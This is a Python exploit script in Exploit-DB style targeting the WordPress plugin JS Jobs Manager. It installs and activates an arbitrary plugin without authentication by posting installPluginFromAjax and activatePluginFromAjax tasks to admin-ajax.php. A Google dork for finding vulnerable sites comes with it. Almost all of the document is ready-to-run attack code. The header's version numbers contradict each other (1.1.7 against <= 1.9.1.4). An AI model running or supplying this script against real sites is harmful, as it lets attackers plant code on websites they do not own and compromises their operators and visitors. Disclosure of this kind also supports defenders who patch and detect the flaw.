# Exploit Title: Wordpress Plugin JS Jobs Manager 1.1.7 - Unauthenticated Plugin Install/Activation
# Google Dork: inurl:/wp-content/plugins/js-jobs/
# Date: 22/09/2021
# Exploit Author: spacehen
# Vendor Homepage: https://wordpress.org/plugins/js-jobs/
# Version: <= 1.9.1.4
# Tested on: Ubuntu 20.04.1

import os.path
from os import path
import json
import requests;
import sys

def print_banner():
	print("JS Job Manager <= 1.1.7 - Arbitrary Plugin Install/Activation")
	print("Author -> space_hen (www.github.com/spacehen)")
	

def print_usage():
	print("Usage: python3 exploit.py [target url] [plugin slug]")
	print("Ex: python3 exploit.py https://example.com advanced-uploader")
	print("Note: To activate plugin successfully, main plugin file")
	print("should match slug, i.e ./plugin-slug/plugin-slug.php")

def vuln_check(uri):
	response = requests.get(uri)
	raw = response.text

	if ("Not Allowed!" in raw):
		return True;
	else:
		return False;

def main():

	print_banner()
	if(len(sys.argv) != 3):
		print_usage();
		sys.exit(1);

	base = sys.argv[1]
	slug = sys.argv[2]

	ajax_action = 'jsjobs_ajax'
	admin = '/wp-admin/admin-ajax.php';

	uri = base + admin + '?action=' + ajax_action ;
	check = vuln_check(uri);

	if(check == False):
		print("(*) Target not vulnerable!");
		sys.exit(1)

	data = {
	"task" : "installPluginFromAjax",
	"jsjobsme" : "jsjobs",
	"pluginslug" : slug
	}
	print("Installing plugin...");
	response = requests.post(uri, data=data )
	print("Activating plugin...");

	data = {
	"task" : "activatePluginFromAjax",
	"jsjobsme" : "jsjobs",
	"pluginslug" : slug
	}
	response = requests.post(uri, data=data )

main();